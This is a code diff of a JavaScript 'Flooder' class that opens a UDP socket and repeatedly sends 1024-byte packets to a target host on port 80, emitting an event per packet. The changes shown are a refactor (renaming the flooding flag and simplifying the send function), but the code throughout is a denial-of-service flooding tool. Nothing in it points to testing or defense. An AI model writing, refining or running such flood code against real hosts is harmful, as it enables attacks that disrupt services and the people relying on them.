@@ -5,7 +5,7 @@ module.exports = class Flooder extends events.EventEmitter {
   constructor(targetHost) {
     super()
     this.targetHost = targetHost
-    this._flooding = false
+    this.isFlooding = false
     this.client = dgram.createSocket('udp4')
   }
 
@@ -19,20 +19,19 @@ module.exports = class Flooder extends events.EventEmitter {
       })
     }
 
-    const sendOne = (ip, port) => {
-      return new Promise((resolve, reject) => {
+    const sendOne = (ip, port) =>
+      new Promise(resolve => {
         const msg = Buffer.alloc(1024)
-        this.client.send(msg, port, ip, () => resolve(!this._flooding))
+        this.client.send(msg, port, ip, () => resolve(!this.isFlooding))
         this.emit('packet')
       })
-    }
 
     until(() => sendOne(this.targetHost, 80))
 
-    this._flooding = true
+    this.isFlooding = true
   }
 
   stop() {
-    this._flooding = false
+    this.isFlooding = false
   }
 }
